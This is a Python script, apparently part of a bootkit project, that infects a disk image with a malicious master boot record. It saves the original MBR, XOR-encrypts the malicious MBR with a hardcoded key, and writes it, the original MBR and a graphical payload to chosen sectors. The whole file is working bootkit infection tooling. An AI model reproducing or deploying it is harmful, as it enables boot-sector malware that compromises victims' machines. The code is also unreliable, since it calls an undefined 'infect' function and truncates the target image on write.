#!/usr/bin/python

import re, sys, os
import argparse

#####################################################################
#	infect writes a malicious MBR to the disk image
#	a disk image can be created with bximage, qemu-img, 
#	or another tool
#	
#	##The code was based on the script from 
#	"Rootkits and Bootkits"(Page 213)
#	written by Alex Matrosov, Eugene Rodionov and Sergey Bratus
#	I have adapted the script and added additional features
# 	including functions that are used to test encryption/decryption 
#	functionality and routines of the viral MBR for the
# 	Michelangelo REanimator bootkit
#####################################################################

def steal_mbr(disk_img, stolen_mbr):
	with open(disk_img, "r+b") as disk_img_file:
		disk_img_file.seek(0)
		og_mbr=disk_img_file.read(2048)
		with open(stolen_mbr, "w+b") as stolenmbr:
			stolenmbr.write(og_mbr)
	return 0


def vxinfect(mal_mbr, disk_img, sector_number):
	with open(mal_mbr, 'rb') as mbr_file:
		mbr=mbr_file.read()
		with open(disk_img, "r+b") as disk_img_file:
			#disk_img_file.seek(0)
			diskadr_offset=sector_number*512
			disk_img_file.seek(diskadr_offset)
			disk_img_file.write(mbr)
	return 0

##hardcoding these vals for now
#mbr_crypt_len=0x9c
mbr_crypt_len=0x115
crypt_offset=0x27
testkey=0x12
#def mbr_encrypt(mbr, crypt_offset, mbr_crypt_len):
def mbr_encrypt(mbr):
##	print("Initial MBR bytes: {0} \n\n".format(mbr))
	end_byte_index=crypt_offset+mbr_crypt_len
	mbr_crypt_buf=mbr[crypt_offset:end_byte_index]
##	print("Initial MBR crypting region bytes: {0} \n\n".format(mbr_crypt_buf))
	decryption_key=bytes([testkey])*(mbr_crypt_len)
##	print("decryption key: {0}".format(decryption_key))	
	fixed_xor_lambda=lambda x: x[0]^x[1]
		
	encrypted_mbr = bytes(fixed_xor_lambda((a,b)) for a,b in zip(decryption_key, mbr_crypt_buf))
##	print("Final MBR crypting region bytes: {0} \n\n".format(encrypted_mbr))
	mbr_start=mbr[:crypt_offset]
	mbr_end=mbr[end_byte_index:]
	entire_mbr=mbr_start+encrypted_mbr+mbr_end
##	print(entire_mbr)
	#return mbr
	return entire_mbr	

def vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector_number, og_mbr, og_mbr_sector_number, vxpaint, vxsector_number):
	with open(mal_mbr, 'rb') as mbr_file:
		mbr=mbr_file.read()
		crypted_mbr=mbr_encrypt(mbr)
		with open(og_mbr, 'rb') as ogmbr_file:
			ogmbr=ogmbr_file.read()
			with open(vxpaint, 'rb') as vxpaintfile:
				vxpainting=vxpaintfile.read()
				with open(disk_img, "w+b") as disk_img_file:
					#disk_img_file.seek(0)
					diskadr_offset=sector_number*512
					disk_img_file.seek(diskadr_offset)
					disk_img_file.write(crypted_mbr)
					og_mbr_offset=og_mbr_sector_number*512
					disk_img_file.seek(og_mbr_offset)
					disk_img_file.write(ogmbr)
					vxpaint_offset=vxsector_number*512
					#print("vxpaint_offset : {0}".format(vxpaint_offset))
					#print("vxpaint len : {0}".format(len(vxpainting)))
					disk_img_file.seek(vxpaint_offset)
					#print("vxpaint_offset : {0}".format(vxpaint_offset))
					disk_img_file.write(vxpainting)
	return 0


def setup_options():
	parser = argparse.ArgumentParser(description='Infects a disk image with a malicious MBR; to be used for bootkit development/debugging/dynamic analysis')
	parser.add_argument('-mbr', type=str, help='path of malicious MBR file to be written to the target disk image')
	parser.add_argument('-ogmbr', type=str, help='path of original saved MBR file to be written back to the target disk image')
	parser.add_argument('-vxpaint', type=str, help='path of graphical payload to be displayed by vx graphics routines  in the target disk image')
	parser.add_argument('-diskimg', type=str, help='path of target disk image to be infected with the malicious MBR')
	parser.add_argument('-sector', type=int, help='starting sector on cylinder 0, head 0 of disk to write payload to')
	parser.add_argument('-ogmbrsector', type=int, help='starting sector on cylinder 0, head 0 of disk to write saved copy of original MBR to')
	parser.add_argument('-vxpaintsector', type=int, nargs='?', help='starting sector of vxpaint graphical payload, on cylinder 0, head 0 of disk to write payload to')
	parser.add_argument('-vxpaintnum', type=int, nargs='?', required=False, help='Number of sectors reserved for vxpaint graphical payload, cylinder 0, head 0 of disk to write payload to')
	parser.add_argument('-stealmbr', type=str, nargs='?', required=False, default='stolen_og_mbr.mbr', help='Copy original MBR from disk_img and write it to file specified by stealmbr; default is stolen_og_mbr.mbr')
	
	args = parser.parse_args()
	return parser, args

if __name__ == '__main__':
	parser, args = setup_options()
	mal_mbr=args.mbr
	og_mbr=args.ogmbr
	disk_img=args.diskimg
	sector=args.sector
	og_mbr_sector=args.ogmbrsector
	vx_paint=args.vxpaint
	vx_paintsector=args.vxpaintsector
	vx_paintnum=args.vxpaintnum
	stolen_mbr=args.stealmbr

	if stolen_mbr != None:
		steal_mbr(disk_img, stolen_mbr)
	
	if vx_paint == None:
		if mal_mbr != None:
			infect(mal_mbr, disk_img, sector)

	else:
		if mal_mbr != None:
			vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector, og_mbr, og_mbr_sector, vx_paint, vx_paintsector)
		else:
			print("You need to provide me with a malicious MBR if you want me to infect a disk image, honey.")
